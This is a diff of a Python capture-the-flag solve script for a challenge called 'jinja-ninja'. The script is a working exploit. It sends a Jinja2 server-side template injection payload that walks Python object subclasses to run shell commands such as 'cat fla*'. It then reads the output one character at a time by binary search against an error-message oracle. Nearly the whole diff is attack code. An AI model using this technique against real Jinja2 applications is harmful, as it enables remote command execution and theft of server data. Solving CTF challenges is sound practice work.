@@ -2,6 +2,18 @@ import requests
 import math
 import sys
 
+base_url = 'https://jinja-ninja.secchallenge.crysys.hu'
+
+
+def solve():
+    flag = ''
+
+    while not flag.endswith('}'):
+        flag += get_char_at('cat fla*', len(flag))
+
+    return flag
+
+
 def is_char_at_less_than(cmd, ich, ch):
     template = '''
         {% for x in ().__class__.__base__.__subclasses__() %}
@@ -14,16 +26,15 @@ def is_char_at_less_than(cmd, ich, ch):
         {% endfor %}
     '''
 
-    r = requests.post('https://jinja-ninja.secchallenge.crysys.hu/submit', data={
+    resp = requests.post(f'{base_url}/submit', data={
         "name": template,
-        "email": "a",
-        "faction": "4",
-        "profession": "c",
-        "preferences": "c",
-    })
-    resp = r.text
-    r = 'Something went wrong' in resp
-    return r
+        "email": "",
+        "faction": "",
+        "profession": "",
+        "preferences": "",
+    }).text
+    
+    return 'Something went wrong' in resp
 
 
 def get_char_at(cmd, ich):
@@ -44,16 +55,6 @@ def get_char_at(cmd, ich):
     sys.stdout.write(chr(lo))
     sys.stdout.flush()
     return chr(lo)
-
-
-def solve():
-    flag = ''
-
-    while not flag.endswith('}'):
-        flag += get_char_at('cat fla*', len(flag))
-
-    print()
-    return flag
 
 
 if __name__ == "__main__":
